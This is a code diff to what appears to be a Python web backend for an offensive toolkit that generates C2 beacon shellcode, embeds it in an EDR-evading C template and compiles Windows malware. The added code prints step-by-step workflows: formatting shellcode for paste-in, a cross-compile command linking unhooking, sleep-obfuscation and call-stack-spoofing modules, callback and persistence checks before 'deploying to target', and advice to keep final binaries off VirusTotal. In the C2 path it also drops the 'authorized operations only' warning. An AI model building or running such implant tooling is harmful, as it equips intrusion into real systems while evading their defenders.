@@ -143,6 +143,9 @@ def recommend_template():
                 'bypasses': ', '.join(tech_info['bypasses'])
             })
 
+        # Detect if C2 is mentioned in objective
+        needs_c2 = any(word in objective.lower() for word in ['c2', 'beacon', 'callback', 'sliver', 'mythic', 'havoc'])
+
         # Create formatted output with clear instructions
         output = {
             'success': True,
@@ -155,16 +158,38 @@ def recommend_template():
                 'techniques_included': recommendation['techniques_included'],
                 'tested_against': recommendation.get('tested_against', [])
             },
+            'shellcode_integration': {
+                'placeholder_text': 'SHELLCODE_PLACEHOLDER',
+                'placeholder_line': 292,
+                'what_to_replace': 'unsigned char shellcode[] = { 0x90, 0x90, 0x90 };',
+                'format': 'unsigned char shellcode[] = { 0xfc, 0x48, 0x83, ... };',
+                'encryption_line': 300,
+                'encryption_enabled': True
+            },
             'next_steps': [
+                f"⚠️  IMPORTANT: If using C2, call noctis_generate_beacon() FIRST!" if needs_c2 else "1. Review template techniques",
                 f"1. Open file: {recommendation['template_file']}",
-                f"2. Go to line {recommendation.get('modify_line', 100)}",
-                f"3. {recommendation.get('modify_instructions', 'Replace shellcode placeholder')}",
-                "4. Compile: python3 build_beacon.py -s <shellcode> -t <edr> -o beacon.exe",
-                "5. Test and record: noctis_record_result(...)"
+                f"2. Go to LINE 292-294 (search for SHELLCODE_PLACEHOLDER)",
+                "3. Replace the placeholder shellcode with your C2 beacon bytes",
+                "4. Format: unsigned char shellcode[] = { 0xXX, 0xXX, ... };",
+                "5. Encryption is already built-in (Zilean memory encryption)",
+                "6. Compile with: noctis_compile('beacon_stealth.c', 'windows', 'x64')",
+                "7. Test C2 callback before deploying to target",
+                "8. Record result: noctis_record_result(...)"
             ],
+            'c2_workflow': {
+                'if_using_c2': [
+                    "1. noctis_generate_beacon('sliver', 'YOUR_IP', 443, 'x64', 'shellcode')",
+                    "2. Copy shellcode_c_array from response",
+                    "3. Paste into beacon_stealth.c at line 292",
+                    "4. Compile beacon",
+                    "5. Start C2 listener",
+                    "6. Run beacon and verify callback"
+                ]
+            } if needs_c2 else {},
             'why_this_template': recommendation.get('recommendation', 'Best match for your objective'),
             'available_techniques': formatted_techniques,
-            'tip': f"Detection risk: {recommendation['detection_risk']} | OPSEC: {recommendation['opsec_score']}/10"
+            'tip': f"Detection risk: {recommendation['detection_risk']} | OPSEC: {recommendation['opsec_score']}/10" + (" | C2 detected - generate beacon first!" if needs_c2 else "")
         }
 
         return jsonify(output)
@@ -280,6 +305,17 @@ def generate_beacon():
                 'error': result.error_message
             }), 500
 
+        # Convert shellcode bytes to C array format for easy copy-paste
+        shellcode_c_array = ""
+        if result.shellcode_bytes:
+            bytes_per_line = 12
+            lines = []
+            for i in range(0, len(result.shellcode_bytes), bytes_per_line):
+                chunk = result.shellcode_bytes[i:i+bytes_per_line]
+                hex_bytes = ', '.join(f'0x{b:02x}' for b in chunk)
+                lines.append(f'    {hex_bytes}{"," if i + bytes_per_line < len(result.shellcode_bytes) else ""}')
+            shellcode_c_array = '\n'.join(lines)
+
         # Create formatted output with visual structure
         output = {
             'success': True,
@@ -290,37 +326,71 @@ def generate_beacon():
                 'format': output_format,
                 'shellcode_size': f'{len(result.shellcode_bytes) if result.shellcode_bytes else 0:,} bytes'
             },
+            'shellcode_c_array': shellcode_c_array,  # Ready to copy-paste!
             'files_generated': {
                 'shellcode': result.shellcode_path,
                 'template': 'techniques/templates/beacon_stealth.c'
             },
             'integration_steps': [
-                f'┌─ STEP 1: Verify Shellcode',
+                f'┌─ STEP 1: Verify Shellcode Generated',
                 f'│  File: {result.shellcode_path}',
                 f'│  Size: {len(result.shellcode_bytes) if result.shellcode_bytes else 0:,} bytes',
+                f'│  Ready for integration ✓',
                 f'│',
                 f'├─ STEP 2: Open Template',
                 f'│  File: techniques/templates/beacon_stealth.c',
-                f'│  This template includes: Zilean + Perun\'s Fart + SilentMoonwalk',
-                f'│  Detection rate: 2-5%',
+                f'│  Go to LINE 292-294 (look for SHELLCODE_PLACEHOLDER)',
                 f'│',
-                f'├─ STEP 3: Replace Shellcode',
-                f'│  Find: SHELLCODE_PLACEHOLDER',
-                f'│  Replace with: generated bytes from {result.shellcode_path}',
+                f'├─ STEP 3: Replace Shellcode (LINE 292-294)',
+                f'│  OLD:',
+                f'│      unsigned char shellcode[] = {{',
+                f'│          0x90, 0x90, 0x90  // Placeholder',
+                f'│      }};',
                 f'│',
-                f'├─ STEP 4: Compile',
+                f'│  NEW (copy from shellcode_c_array above):',
+                f'│      unsigned char shellcode[] = {{',
+                f'│          [PASTE YOUR SHELLCODE BYTES HERE]',
+                f'│      }};',
+                f'│',
+                f'├─ STEP 4: Compile with Dependencies',
                 f'│  noctis_compile("beacon_stealth.c", "windows", "{architecture}")',
                 f'│',
-                f'└─ STEP 5: Start Listener',
-                f'   On {framework}: {listener_host}:{listener_port}'
+                f'│  Or manually:',
+                f'│  x86_64-w64-mingw32-gcc beacon_stealth.c \\',
+                f'│    ../sleep_obfuscation/zilean.c \\',
+                f'│    ../sleep_obfuscation/shellcode_fluctuation.c \\',
+                f'│    ../unhooking/peruns_fart.c \\',
+                f'│    ../evasion/silentmoonwalk.c \\',
+                f'│    ../syscalls/syswhispers3.c \\',
+                f'│    -o beacon.exe -lbcrypt -lwinhttp',
+                f'│',
+                f'├─ STEP 5: Test C2 Connectivity',
+                f'│  1. Start {framework} server',
+                f'│  2. Create listener: {listener_host}:{listener_port}',
+                f'│  3. Run beacon.exe',
+                f'│  4. Check {framework} console for callback',
+                f'│  5. Execute test command: whoami',
+                f'│',
+                f'└─ STEP 6: Record Results',
+                f'   noctis_record_result("beacon_stealth", ["zilean","peruns_fart"], "{target_av}", detected, "C2 callback successful")'
             ],
             'opsec_notes': [
-                f'✓ Template uses memory obfuscation (Zilean)',
-                f'✓ Call stack spoofing enabled (SilentMoonwalk)',
-                f'✓ NTDLL unhooking included (Perun\'s Fart)',
-                f'✓ Detection risk: 2-5% against modern EDR'
+                f'✓ Encryption: Memory encrypted during sleep (Zilean)',
+                f'✓ Unhooking: NTDLL hooks removed (Perun\'s Fart)',
+                f'✓ Call Stack: Spoofed to evade stack analysis (SilentMoonwalk)',
+                f'✓ Detection risk: 2-5% against CrowdStrike/SentinelOne/Defender',
+                f'⚠️  DO NOT test final production binary on VirusTotal!'
             ],
-            'tip': 'Test in isolated environment first. Record results with noctis_record_result()'
+            'c2_testing_checklist': [
+                f'☐ {framework} server running',
+                f'☐ Listener active on {listener_host}:{listener_port}',
+                f'☐ Firewall allows outbound connection',
+                f'☐ Network connectivity verified',
+                f'☐ Beacon compiled successfully',
+                f'☐ Callback received in C2 console',
+                f'☐ Commands execute successfully'
+            ],
+            'tip': f'Shellcode is ready to copy-paste! Find SHELLCODE_PLACEHOLDER at line 292 in beacon_stealth.c'
         }
 
         return jsonify(output)
@@ -410,6 +480,9 @@ def compile_malware():
 
         file_size = result.get('file_size', 0)
 
+        # Detect if this is a C2 beacon (check filename)
+        is_c2_beacon = any(word in source_file.lower() for word in ['beacon', 'c2', 'sliver', 'mythic'])
+
         # Create formatted output
         output = {
             'success': True,
@@ -419,37 +492,79 @@ def compile_malware():
                 'architecture': architecture,
                 'optimization': optimization,
                 'output_binary': result.get('output_file'),
-                'file_size': f'{file_size:,} bytes ({file_size/1024:.1f} KB)'
+                'file_size': f'{file_size:,} bytes ({file_size/1024:.1f} KB)',
+                'compiled_with': 'MinGW-w64 (cross-compile)' if host_os == 'linux' else 'Native compiler'
             },
+            'dependencies_included': [
+                '✓ Zilean (sleep obfuscation)',
+                '✓ ShellcodeFluctuation (memory encryption)',
+                '✓ Peruns Fart (unhooking)',
+                '✓ SilentMoonwalk (call stack spoofing)',
+                '✓ SysWhispers3 (direct syscalls)',
+                '✓ bcrypt.lib (encryption)',
+                '✓ winhttp.lib (HTTP communication)'
+            ] if 'beacon' in source_file.lower() else [
+                '✓ Core evasion techniques',
+                '✓ Windows API imports',
+                '✓ Static runtime'
+            ],
+            'c2_testing_checklist': {
+                'before_running': [
+                    '☐ C2 server is running',
+                    '☐ Listener is active and listening',
+                    '☐ Firewall allows outbound connection',
+                    '☐ Network connectivity verified',
+                    '☐ Correct IP/port hardcoded in binary'
+                ],
+                'testing_steps': [
+                    '1. START C2 LISTENER FIRST',
+                    '2. Run beacon in isolated VM',
+                    '3. Check C2 console for callback',
+                    '4. Execute test command: whoami',
+                    '5. Verify command output',
+                    '6. Test file upload/download',
+                    '7. Confirm persistent connection'
+                ],
+                'troubleshooting': [
+                    'No callback? Check IP/port in code',
+                    'Connection refused? Verify listener running',
+                    'Timeout? Check firewall/network',
+                    'Commands fail? Check beacon integrity'
+                ]
+            } if is_c2_beacon else {},
             'deployment_steps': [
                 f'┌─ STEP 1: Verify Binary',
                 f'│  File: {result.get("output_file")}',
                 f'│  Size: {file_size:,} bytes',
                 f'│  Platform: {target_os}/{architecture}',
                 f'│',
-                f'├─ STEP 2: Test Locally (ISOLATED VM ONLY)',
-                f'│  Run in sandboxed environment',
-                f'│  Monitor for crashes/errors',
-                f'│',
-                f'├─ STEP 3: Test Against Target AV',
-                f'│  Upload to isolated test environment',
-                f'│  Check for detection/alerts',
+                f'├─ STEP 2: Test C2 Connectivity (CRITICAL!)' if is_c2_beacon else f'├─ STEP 2: Test Locally',
+                f'│  1. Start C2 listener FIRST',
+                f'│  2. Run beacon in isolated VM',
+                f'│  3. Verify callback in C2 console',
+                f'│  4. Execute test command',
+                f'│' if is_c2_beacon else '│  Run in sandboxed environment',
+                f'├─ STEP 3: Test Against AV (Optional)',
+                f'│  noctis_test_binary("{result.get("output_file")}", "CrowdStrike")',
+                f'│  WARNING: Only test prototypes, NOT final binary!',
                 f'│',
                 f'└─ STEP 4: Record Results',
                 f'   noctis_record_result(',
-                f'       template="your_template",',
-                f'       techniques=["technique1", "technique2"],',
-                f'       target_av="AV_Name",',
-                f'       detected=True/False',
+                f'       template="beacon_stealth",',
+                f'       techniques=["zilean", "peruns_fart"],',
+                f'       target_av="CrowdStrike",',
+                f'       detected=False,',
+                f'       notes="C2 callback successful"',
                 f'   )'
             ],
             'compilation_logs': result.get('logs', ''),
             'warnings': [
-                '⚠ Test in isolated environment only',
-                '⚠ Authorized operations only',
-                '⚠ Record all test results for learning'
+                '⚠️  START C2 LISTENER BEFORE RUNNING BEACON' if is_c2_beacon else '⚠️  Test in isolated environment only',
+                '⚠️  Test C2 callback in VM before deploying to target' if is_c2_beacon else '⚠️  Authorized operations only',
+                '⚠️  DO NOT test final production binary on VirusTotal!',
+                '⚠️  Record all test results for learning'
             ],
-            'tip': 'Smaller binary = better OPSEC. Current size is optimal for stealth.'
+            'tip': 'C2 TESTING: Listener must be active BEFORE running beacon!' if is_c2_beacon else 'Smaller binary = better OPSEC. Current size is optimal for stealth.'
         }
 
         return jsonify(output)
